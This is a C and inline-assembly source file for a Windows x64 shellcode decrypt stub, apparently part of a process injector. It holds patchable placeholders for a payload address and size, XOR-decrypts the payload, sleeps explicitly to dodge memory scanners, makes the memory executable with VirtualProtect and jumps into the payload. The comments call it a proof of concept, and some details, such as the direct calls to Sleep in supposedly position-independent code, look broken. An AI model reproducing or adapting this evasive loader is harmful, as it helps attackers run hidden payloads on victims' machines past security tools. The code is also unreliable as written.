#include <windows.h>

// This file will be compiled to position-independent code (shellcode)
// It contains three "eggs" (placeholders) that will be patched by the main injector:
// 1. Encrypted payload address (0x88 * 8)
// 2. Payload size (0xDEAD10AF)
// 3. Jump address in trampoline (0x00 * 8 in "mov r10, addr; jmp r10")

#define XOR_KEY 0x04030201

// Decrypt function using XOR
__attribute__((section(".text"))) void XorDecrypt(unsigned char* data, DWORD size) {
    DWORD* data32 = (DWORD*)data;
    DWORD key = XOR_KEY;

    // XOR 4 bytes at a time
    DWORD fullBlocks = size / 4;
    for (DWORD i = 0; i < fullBlocks; i++) {
        data32[i] ^= key;
    }

    // XOR remaining bytes
    for (DWORD i = fullBlocks * 4; i < size; i++) {
        data[i] ^= (unsigned char)(key & 0xFF);
    }
}

// Main decrypt stub entry point
__attribute__((section(".text"))) void DecryptStub() {
    // Egg 1: Address of encrypted payload (will be patched)
    // Pattern: 0x88 * 8
    __asm__ volatile (
        ".byte 0x48, 0xB9, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88\n"  // mov rcx, 0x8888888888888888
    );
    register void* payloadAddr asm("rcx");

    // Egg 2: Size of encrypted payload (will be patched)
    // Pattern: 0xDEAD10AF
    __asm__ volatile (
        ".byte 0x48, 0xC7, 0xC2, 0xAF, 0x10, 0xAD, 0xDE\n"  // mov rdx, 0xDEAD10AF
    );
    register DWORD payloadSize asm("edx");

    // Step 1: Sleep to avoid immediate memory scan triggered by thread creation
    // Resolve Sleep from kernel32.dll (simplified - in real implementation use API hashing)
    typedef VOID (WINAPI* SleepFunc)(DWORD);

    // Hardcoded kernel32.dll base (in real implementation, walk PEB)
    // For POC, we'll use GetModuleHandleA
    HMODULE kernel32 = (HMODULE)0x00007FF800000000; // Placeholder

    // Get Sleep address (simplified)
    // In real implementation: parse PE exports with hash
    // For POC: inline the sleep using raw instructions
    __asm__ volatile (
        "mov rcx, 5000\n"           // 5 second sleep
        "sub rsp, 0x28\n"           // Shadow space
        "call Sleep\n"              // Call Sleep (will be resolved by loader)
        "add rsp, 0x28\n"
    );

    // Step 2: Decrypt payload using XOR
    XorDecrypt((unsigned char*)payloadAddr, payloadSize);

    // Step 3: Change memory protection from RW to RX
    typedef BOOL (WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);

    DWORD oldProtect;
    __asm__ volatile (
        "mov rcx, %0\n"             // lpAddress = payloadAddr
        "mov rdx, %1\n"             // dwSize = payloadSize
        "mov r8d, 0x20\n"           // flNewProtect = PAGE_EXECUTE_READ
        "lea r9, %2\n"              // lpflOldProtect = &oldProtect
        "sub rsp, 0x28\n"
        "call VirtualProtect\n"
        "add rsp, 0x28\n"
        :
        : "r"(payloadAddr), "r"((SIZE_T)payloadSize), "m"(oldProtect)
        : "rcx", "rdx", "r8", "r9"
    );

    // Step 4: Jump to decrypted payload
    // Trampoline: mov r10, addr; jmp r10
    // Pattern: 49 BA 00 00 00 00 00 00 00 00 41 FF E2
    __asm__ volatile (
        ".byte 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n"  // mov r10, 0x0000000000000000
        ".byte 0x41, 0xFF, 0xE2\n"  // jmp r10
    );
}
